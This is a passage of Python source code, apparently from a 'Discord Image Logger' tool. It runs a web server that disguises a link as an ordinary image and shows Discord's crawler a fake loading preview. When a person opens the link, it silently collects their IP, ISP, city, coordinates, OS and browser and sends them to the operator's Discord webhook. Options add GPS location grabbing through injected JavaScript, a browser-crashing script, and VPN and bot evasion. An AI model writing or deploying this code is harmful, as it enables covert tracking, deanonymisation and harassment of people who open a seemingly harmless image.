IoB9+gf4GMvYqgopEyY8irDlwAFYhCBe+o0JPfaHOropc0WmS1cdjKD+MLWIdHtJMJKh5Z/YbTya8YZXAzY+S224rCvY5nXp5omDnaY0sYd5lNimFjpCpZs2jaXJlGazMug4gA5sw7eAHvjVjYOdL+r18xPEEfla3wj0/wDDmKAaYjr33/uselziILSsKNGhTqtq067bEHrB404wD6rdbGJPWklJUJlmIMttL5V0UmxOto09NgFSMUmVZKCUdON7rlCgWtoeqCYsTZ/FeDVw8QT/AGSLG2HqZhvPxB2HMDOfxa3wjzUAQbKZopsfUf01MZwQYa82Jm0geq3e09RRvJaXUzlCmxIVxnupBFgLnjC3I2ukSE3GH07ub6XB1J0uQLsx8bRuaHo/pZdiweYf2msPJbQx0dBKlC0uUiD9lQPwj2Hm9goRXwdJmQZ6gmYJytnjAJJ8lH/+isWrdZ03cSj93Vf6Abn+KGPA9iaans2XeuPvzNbHtC8BDPBHoptBk3PNQ1tpVnt6NsMZ+1oyjv3nvKLQQQRItBEEEEERBBBBFEPykPqdL7c/ptHPkdB/KQ+p0vtz+m0c+QREEEEERBBBBEQQQQRENnRV9q0f75/I0Vggi6b37es3mYN+3rN5mKQQRV37es3mYN+3rN5mKQQRV37es3mYN+3rN5mKQQRV37es3mYN+3rN5mKQQRV37es3mYN+3rN5mKQQRV37es3mYN+3rN5mKQQRV37es3mYN+3rN5mCCCI37es3mYN+3rN5mKQQRV37es3mYN+3rN5mKQQRV37es3mYN+3rN5mKQQRV37es3mYN+3rN5mKQQRV37es3mYN+3rN5mKQQRRd8oNyaSmuSfpjz/YMQTBBBEQQQQREEEEEX/9k=", # You can also have a custom image by using a URL argument", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
